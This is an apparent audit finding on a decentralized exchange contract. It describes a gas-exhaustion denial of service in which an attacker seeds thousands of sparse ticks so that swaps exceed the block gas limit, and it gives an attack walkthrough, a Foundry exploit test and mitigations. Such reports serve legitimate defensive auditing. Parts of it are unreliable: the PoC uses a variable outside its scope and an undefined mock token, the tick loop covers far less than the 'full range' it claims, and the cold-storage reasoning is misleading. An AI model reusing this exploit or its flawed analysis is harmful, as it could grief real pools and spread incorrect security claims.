## Title
Unbounded Tick Traversal Enables Gas-Based Denial of Service on Swap Operations

## Summary
An attacker can initialize liquidity positions across thousands of sparsely distributed ticks spanning the full [MIN_TICK, MAX_TICK] range, causing storage slots computed by `poolTicksSlot()` to span 177 million addresses. Subsequent swap operations that cross these initialized ticks repeatedly hit cold storage, with each tick requiring ~6,300 gas (3 cold SLOADs). With no protocol-enforced limit on ticks crossed per swap, an attacker can force swaps to exceed block gas limits, rendering the pool's core functionality unusable.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The swap function should efficiently traverse initialized ticks using a bitmap search mechanism, loading tick data only when crossing active liquidity boundaries. The `skipAhead` parameter allows users to optimize gas costs by limiting bitmap searches.

**Actual Logic:** The swap contains an unbounded `while(true)` loop with no maximum iteration limit. When an attacker initializes thousands of ticks distributed across the full tick range, each tick crossed triggers cold storage access: [2](#0-1) 

For each initialized tick, the code performs:
1. One cold SLOAD of tick data at line 760 (2,100 gas)
2. Two cold SLOADs of fee tracking slots at lines 787-789 or 794-796 (4,200 gas)
3. Additional bitmap word loads

**Storage Slot Distribution:** [3](#0-2) [4](#0-3) 

Storage slots are computed as `poolId + tick + TICKS_OFFSET`, where ticks range from -88,722,835 to +88,722,835. This creates a storage slot span of **177,445,670 consecutive addresses**. Ticks initialized far apart (e.g., every 256 ticks) occupy storage slots that are guaranteed cold on first access within a transaction.

**Exploitation Path:**

1. **Attack Setup**: Attacker calls `Core.updatePosition()` to create ~2,500 positions with non-overlapping tick ranges spread across [MIN_TICK, MAX_TICK], initializing ~5,000 distinct ticks. [5](#0-4) [6](#0-5) 

2. **Tick Initialization**: Each `_updateTick` call writes tick data and flips the bitmap bit when `liquidityNet` transitions from 0 to non-zero: [7](#0-6) 

3. **Victim Swap**: A user calls `Core.swap()` with moderate amount and high `skipAhead` to find liquidity. The swap loop continues crossing initialized ticks: [8](#0-7) 

4. **Gas Exhaustion**: With 5,000 ticks initialized, a swap crossing all of them requires:
   - Per tick: 3 cold SLOADs × 2,100 gas = 6,300 gas
   - Total: 5,000 × 6,300 = **31,500,000 gas**
   - Result: Exceeds typical 30M gas block limit, transaction reverts with out-of-gas

**Security Property Broken:** While not explicitly documented, the protocol assumes pool operations remain executable within block gas limits. This attack violates the practical usability requirement, effectively creating a permanent DoS on swap functionality for affected pools.

## Impact Explanation

- **Affected Assets**: All tokens in the attacked pool become unswappable. Users cannot execute trades, arbitrageurs cannot rebalance prices, and the pool's primary function is destroyed.

- **Damage Severity**: Complete loss of swap functionality for the pool. While positions can theoretically still be withdrawn (updatePosition has different gas characteristics), the pool becomes economically worthless as a trading venue. For high-value pools (e.g., WETH/USDC), this represents millions in locked liquidity that cannot be efficiently exited.

- **User Impact**: All users attempting to swap through the affected pool. LPs suffer opportunity cost and slippage when exiting positions through alternative routes. The attack is pool-specific but can be repeated across multiple pools.

## Likelihood Explanation

- **Attacker Profile**: Any user with sufficient capital (~25-50 ETH at current gas prices). Economically rational for attacking high-value pools or as competitive griefing.

- **Preconditions**: 
  - Target pool must be initialized with minimum tick spacing (tickSpacing=1 allows maximum tick density)
  - Attacker needs capital to provide minimal liquidity across ~2,500 positions
  - No existing positions blocking the tick ranges (attacker can work around existing liquidity)

- **Execution Complexity**: Single setup phase requiring ~17-33 blocks to execute 2,500 `updatePosition` transactions, followed by immediate denial of service effect on all subsequent swaps.

- **Frequency**: One-time attack per pool with permanent effect. Attacker can scale across multiple pools. Attack is irreversible unless attacker voluntarily withdraws all positions.

## Recommendation

Implement a maximum tick crossing limit per swap operation:

```solidity
// In src/Core.sol, function swap(), add at line 563:

uint256 constant MAX_TICKS_PER_SWAP = 1000; // Configurable based on gas analysis
uint256 ticksCrossed = 0;

while (true) {
    int32 nextTick;
    bool isInitialized;
    SqrtRatio nextTickSqrtRatio;
    
    // ... existing tick finding logic ...
    
    if (sqrtRatioNext == nextTickSqrtRatio) {
        sqrtRatio = sqrtRatioNext;
        tick = nextTick - (increasing ? 0 : 1);
        
        if (isInitialized) {
            ticksCrossed++;
            if (ticksCrossed > MAX_TICKS_PER_SWAP) {
                // Return partial fill instead of reverting
                break;
            }
            
            // ... existing tick crossing logic ...
        }
    }
    
    // ... rest of loop ...
}
```

**Alternative Mitigations:**

1. **Minimum Liquidity per Tick**: Require a minimum liquidity threshold for tick initialization to increase attack cost
2. **Gas Stipend Check**: Add periodic gas remaining checks within the loop to gracefully exit before hitting block limit
3. **Tick Spacing Enforcement**: Enforce larger minimum tick spacing to reduce maximum possible initialized ticks
4. **Bitmap Caching**: Implement warm storage optimization for bitmap words accessed in previous loop iterations

## Proof of Concept

```solidity
// File: test/Exploit_TickTraversalDoS.t.sol
// Run with: forge test --match-test test_TickTraversalDoS -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/types/poolKey.sol";
import "../src/types/positionId.sol";

contract Exploit_TickTraversalDoS is Test {
    Core core;
    Router router;
    address token0;
    address token1;
    
    function setUp() public {
        core = new Core();
        router = new Router(core);
        token0 = address(new MockERC20());
        token1 = address(new MockERC20());
        
        // Initialize pool with minimum tick spacing
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: createConcentratedPoolConfig(3000, 1, address(0))
        });
        core.initializePool(poolKey, toSqrtRatio(1e18));
    }
    
    function test_TickTraversalDoS() public {
        // SETUP: Attacker initializes 5000 ticks across full range
        // Each position covers 2 ticks, so 2500 positions needed
        address attacker = address(0x1337);
        vm.startPrank(attacker);
        
        // Fund attacker
        MockERC20(token0).mint(attacker, 1e30);
        MockERC20(token1).mint(attacker, 1e30);
        
        int32 currentTick = MIN_TICK;
        for (uint i = 0; i < 2500; i++) {
            int32 tickLower = currentTick;
            int32 tickUpper = currentTick + 256; // Sparse distribution
            
            // Create position with minimal liquidity
            PositionId positionId = createPositionId(tickLower, tickUpper);
            core.updatePosition(poolKey, positionId, 1); // 1 wei liquidity
            
            currentTick += 512; // Skip to next tick range
            if (currentTick > MAX_TICK - 256) break;
        }
        vm.stopPrank();
        
        // EXPLOIT: Normal user attempts swap
        address user = address(0xBEEF);
        vm.startPrank(user);
        MockERC20(token0).mint(user, 1e20);
        
        // This swap should cross many initialized ticks
        SwapParameters memory params = createSwapParameters(
            MAX_SQRT_RATIO, // No price limit
            1e18, // 1 token amount
            true, // isToken1
            10000 // High skipAhead to find all ticks
        );
        
        // VERIFY: Transaction fails with out-of-gas
        // Measure gas before swap
        uint256 gasBefore = gasleft();
        
        vm.expectRevert(); // Expecting out-of-gas revert
        core.swap(poolKey, params);
        
        uint256 gasUsed = gasBefore - gasleft();
        
        // Even partial execution uses excessive gas
        assertGt(gasUsed, 20000000, "Swap consumed excessive gas before reverting");
        
        vm.stopPrank();
    }
}
```

## Notes

The vulnerability is exacerbated by the fact that the `skipAhead` parameter presents users with a false choice:

- **High `skipAhead`**: Required to find all initialized ticks for correct execution, but enables the gas DoS attack
- **Low `skipAhead`**: Limits gas cost but causes incorrect swap execution as the loop terminates early with `isInitialized = false`, skipping liquidity updates [9](#0-8) 

This design places the burden of gas management on users without providing adequate protocol-level protection against malicious tick distribution. The attack is particularly effective because:

1. **Cost Asymmetry**: Attacker pays ~200k gas per position initialization, but victims pay ~6,300 gas per tick crossed during swaps
2. **Permanent Effect**: Once ticks are initialized, they remain active until liquidity is withdrawn
3. **No Recovery**: Protocol has no mechanism to force withdrawal or limit tick density

The recommended mitigation of implementing `MAX_TICKS_PER_SWAP` would preserve partial fill capability while preventing complete DoS, though it introduces new UX considerations for users expecting full order execution.

### Citations

**File:** src/Core.sol (L285-319)
```text
    function _updateTick(PoolId poolId, int32 tick, PoolConfig poolConfig, int128 liquidityDelta, bool isUpper)
        private
    {
        StorageSlot tickInfoSlot = CoreStorageLayout.poolTicksSlot(poolId, tick);

        (int128 currentLiquidityDelta, uint128 currentLiquidityNet) = TickInfo.wrap(tickInfoSlot.load()).parse();
        uint128 liquidityNetNext = addLiquidityDelta(currentLiquidityNet, liquidityDelta);
        // this is checked math
        int128 liquidityDeltaNext =
            isUpper ? currentLiquidityDelta - liquidityDelta : currentLiquidityDelta + liquidityDelta;

        // Check that liquidityNet doesn't exceed max liquidity per tick
        uint128 maxLiquidity = poolConfig.concentratedMaxLiquidityPerTick();
        if (liquidityNetNext > maxLiquidity) {
            revert MaxLiquidityPerTickExceeded(tick, liquidityNetNext, maxLiquidity);
        }

        if ((currentLiquidityNet == 0) != (liquidityNetNext == 0)) {
            flipTick(CoreStorageLayout.tickBitmapsSlot(poolId), tick, poolConfig.concentratedTickSpacing());

            (StorageSlot fplSlot0, StorageSlot fplSlot1) =
                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tick);

            bytes32 v;
            assembly ("memory-safe") {
                v := gt(liquidityNetNext, 0)
            }

            // initialize the storage slots for the fees per liquidity outside to non-zero so tick crossing is cheaper
            fplSlot0.store(v);
            fplSlot1.store(v);
        }

        tickInfoSlot.store(TickInfo.unwrap(createTickInfo(liquidityDeltaNext, liquidityNetNext)));
    }
```

**File:** src/Core.sol (L358-361)
```text
    function updatePosition(PoolKey memory poolKey, PositionId positionId, int128 liquidityDelta)
        external
        payable
        returns (PoolBalanceUpdate balanceUpdate)
```

**File:** src/Core.sol (L400-401)
```text
                _updateTick(poolId, positionId.tickLower(), poolKey.config, liquidityDelta, false);
                _updateTick(poolId, positionId.tickUpper(), poolKey.config, liquidityDelta, true);
```

**File:** src/Core.sol (L564-809)
```text
                while (true) {
                    int32 nextTick;
                    bool isInitialized;
                    SqrtRatio nextTickSqrtRatio;

                    // For stableswap pools, determine active liquidity for this step
                    uint128 stepLiquidity = liquidity;

                    if (config.isStableswap()) {
                        if (config.isFullRange()) {
                            // special case since we don't need to compute min/max tick sqrt ratio
                            (nextTick, nextTickSqrtRatio) =
                                increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (MIN_TICK, MIN_SQRT_RATIO);
                        } else {
                            (int32 lower, int32 upper) = config.stableswapActiveLiquidityTickRange();

                            bool inRange;
                            assembly ("memory-safe") {
                                inRange := and(slt(tick, upper), iszero(slt(tick, lower)))
                            }
                            if (inRange) {
                                nextTick = increasing ? upper : lower;
                                nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                            } else {
                                if (tick < lower) {
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (lower, tickToSqrtRatio(lower)) : (MIN_TICK, MIN_SQRT_RATIO);
                                } else {
                                    // tick >= upper implied
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (upper, tickToSqrtRatio(upper));
                                }
                                stepLiquidity = 0;
                            }
                        }
                    } else {
                        // concentrated liquidity pools use the tick bitmaps
                        (nextTick, isInitialized) = increasing
                            ? findNextInitializedTick(
                                CoreStorageLayout.tickBitmapsSlot(poolId),
                                tick,
                                config.concentratedTickSpacing(),
                                params.skipAhead()
                            )
                            : findPrevInitializedTick(
                                CoreStorageLayout.tickBitmapsSlot(poolId),
                                tick,
                                config.concentratedTickSpacing(),
                                params.skipAhead()
                            );

                        nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                    }

                    SqrtRatio limitedNextSqrtRatio =
                        increasing ? nextTickSqrtRatio.min(sqrtRatioLimit) : nextTickSqrtRatio.max(sqrtRatioLimit);

                    SqrtRatio sqrtRatioNext;

                    if (stepLiquidity == 0) {
                        // if the pool is empty, the swap will always move all the way to the limit price
                        sqrtRatioNext = limitedNextSqrtRatio;
                    } else {
                        // this amount is what moves the price
                        int128 priceImpactAmount;
                        if (isExactOut) {
                            assembly ("memory-safe") {
                                priceImpactAmount := amountRemaining
                            }
                        } else {
                            uint128 amountU128;
                            assembly ("memory-safe") {
                                // cast is safe because amountRemaining is g.t. 0 and fits in int128
                                amountU128 := amountRemaining
                            }
                            uint128 feeAmount = computeFee(amountU128, config.fee());
                            assembly ("memory-safe") {
                                // feeAmount will never exceed amountRemaining since fee is < 100%
                                priceImpactAmount := sub(amountRemaining, feeAmount)
                            }
                        }

                        SqrtRatio sqrtRatioNextFromAmount = isToken1
                            ? nextSqrtRatioFromAmount1(sqrtRatio, stepLiquidity, priceImpactAmount)
                            : nextSqrtRatioFromAmount0(sqrtRatio, stepLiquidity, priceImpactAmount);

                        bool hitLimit;
                        assembly ("memory-safe") {
                            // Branchless limit check: (increasing && next > limit) || (!increasing && next < limit)
                            let exceedsUp := and(increasing, gt(sqrtRatioNextFromAmount, limitedNextSqrtRatio))
                            let exceedsDown :=
                                and(iszero(increasing), lt(sqrtRatioNextFromAmount, limitedNextSqrtRatio))
                            hitLimit := or(exceedsUp, exceedsDown)
                        }

                        // the change in fees per liquidity for this step of the iteration
                        uint256 stepFeesPerLiquidity;

                        if (hitLimit) {
                            (uint256 sqrtRatioLower, uint256 sqrtRatioUpper) =
                                sortAndConvertToFixedSqrtRatios(limitedNextSqrtRatio, sqrtRatio);
                            (uint128 limitSpecifiedAmountDelta, uint128 limitCalculatedAmountDelta) = isToken1
                                ? (
                                    amount1DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, !isExactOut),
                                    amount0DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, isExactOut)
                                )
                                : (
                                    amount0DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, !isExactOut),
                                    amount1DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, isExactOut)
                                );

                            if (isExactOut) {
                                uint128 beforeFee = amountBeforeFee(limitCalculatedAmountDelta, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := add(calculatedAmount, beforeFee)
                                    amountRemaining := add(amountRemaining, limitSpecifiedAmountDelta)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(beforeFee, limitCalculatedAmountDelta)),
                                        stepLiquidity
                                    )
                                }
                            } else {
                                uint128 beforeFee = amountBeforeFee(limitSpecifiedAmountDelta, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := sub(calculatedAmount, limitCalculatedAmountDelta)
                                    amountRemaining := sub(amountRemaining, beforeFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(beforeFee, limitSpecifiedAmountDelta)),
                                        stepLiquidity
                                    )
                                }
                            }

                            sqrtRatioNext = limitedNextSqrtRatio;
                        } else if (sqrtRatioNextFromAmount != sqrtRatio) {
                            uint128 calculatedAmountWithoutFee = isToken1
                                ? amount0Delta(sqrtRatioNextFromAmount, sqrtRatio, stepLiquidity, isExactOut)
                                : amount1Delta(sqrtRatioNextFromAmount, sqrtRatio, stepLiquidity, isExactOut);

                            if (isExactOut) {
                                uint128 includingFee = amountBeforeFee(calculatedAmountWithoutFee, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := add(calculatedAmount, includingFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(includingFee, calculatedAmountWithoutFee)),
                                        stepLiquidity
                                    )
                                }
                            } else {
                                assembly ("memory-safe") {
                                    calculatedAmount := sub(calculatedAmount, calculatedAmountWithoutFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(amountRemaining, priceImpactAmount)),
                                        stepLiquidity
                                    )
                                }
                            }

                            amountRemaining = 0;
                            sqrtRatioNext = sqrtRatioNextFromAmount;
                        } else {
                            // for an exact output swap, the price should always move since we have to round away from the current price
                            assert(!isExactOut);

                            // consume the entire input amount as fees since the price did not move
                            assembly ("memory-safe") {
                                stepFeesPerLiquidity := div(shl(128, amountRemaining), stepLiquidity)
                            }
                            amountRemaining = 0;
                            sqrtRatioNext = sqrtRatio;
                        }

                        // only if fees per liquidity was updated in this swap iteration
                        if (stepFeesPerLiquidity != 0) {
                            if (feesAccessed == 0) {
                                // this loads only the input token fees per liquidity
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                ) + stepFeesPerLiquidity;
                            } else {
                                inputTokenFeesPerLiquidity += stepFeesPerLiquidity;
                            }

                            feesAccessed = 2;
                        }
                    }

                    if (sqrtRatioNext == nextTickSqrtRatio) {
                        sqrtRatio = sqrtRatioNext;
                        assembly ("memory-safe") {
                            // no overflow danger because nextTick is always inside the valid tick bounds
                            tick := sub(nextTick, iszero(increasing))
                        }

                        if (isInitialized) {
                            bytes32 tickValue = CoreStorageLayout.poolTicksSlot(poolId, nextTick).load();
                            assembly ("memory-safe") {
                                // if increasing, we add the liquidity delta, otherwise we subtract it
                                let liquidityDelta :=
                                    mul(signextend(15, tickValue), sub(increasing, iszero(increasing)))
                                liquidity := add(liquidity, liquidityDelta)
                            }

                            (StorageSlot tickFplFirstSlot, StorageSlot tickFplSecondSlot) =
                                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, nextTick);

                            if (feesAccessed == 0) {
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                );
                                feesAccessed = 1;
                            }

                            uint256 globalFeesPerLiquidityOther = uint256(
                                CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(!increasing))
                                    .load()
                            );

                            // if increasing, it means the pool is receiving token1 so the input fees per liquidity is token1
                            if (increasing) {
                                tickFplFirstSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplSecondSlot.load()))
                                );
                            } else {
                                tickFplFirstSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplSecondSlot.load()))
                                );
                            }
                        }
                    } else if (sqrtRatio != sqrtRatioNext) {
                        sqrtRatio = sqrtRatioNext;
                        tick = sqrtRatioToTick(sqrtRatio);
                    }

                    if (amountRemaining == 0 || sqrtRatio == sqrtRatioLimit) {
                        break;
                    }
                }
```

**File:** src/libraries/CoreStorageLayout.sol (L64-68)
```text
    function poolTicksSlot(PoolId poolId, int32 tick) internal pure returns (StorageSlot slot) {
        assembly ("memory-safe") {
            slot := add(poolId, add(tick, TICKS_OFFSET))
        }
    }
```

**File:** src/math/constants.sol (L10-14)
```text
int32 constant MIN_TICK = -88722835;

// The maximum tick value supported by the protocol
// Corresponds to the maximum possible price ratio in the protocol
int32 constant MAX_TICK = 88722835;
```

**File:** src/math/tickBitmap.sol (L72-78)
```text
            // if we are done searching, stop here
            if (skipAhead == 0) {
                break;
            }

            skipAhead--;
        }
```
